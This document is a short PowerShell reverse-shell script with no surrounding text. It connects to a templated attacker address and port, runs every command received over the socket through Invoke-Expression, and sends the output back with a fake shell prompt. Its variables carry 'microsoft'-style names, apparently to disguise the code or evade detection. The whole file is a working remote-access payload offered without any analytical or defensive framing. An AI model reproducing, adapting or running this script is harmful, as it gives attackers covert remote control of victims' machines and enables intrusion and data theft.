$microsoftA = New-Object System.Net.Sockets.TCPClient('%ip%', %port%);
$microsoftB = $microsoftA.GetStream();
[byte[]]$microsoftC = 0..65535|%{0};
while(($microsoftD = $microsoftB.Read($microsoftC, 0, $microsoftC.Length)) -ne 0){
    $microsoftE = (New-Object -TypeName System.Text.UTF8Encoding).GetString($microsoftC,0, $microsoftD);
    $microsoftF = ((iex $microsoftE -ErrorVariable microsoftH *>&1 | Out-String) + $microsoftH);
    $microsoftG = ([text.encoding]::UTF8).GetBytes($microsoftF+'P'+'S'+' '+(pwd).Path+'>'+' ');
    $microsoftB.Write($microsoftG,0,$microsoftG.Length);
    $microsoftB.Flush();
    Remove-Variable microsoftH;
};
$microsoftA.Close()
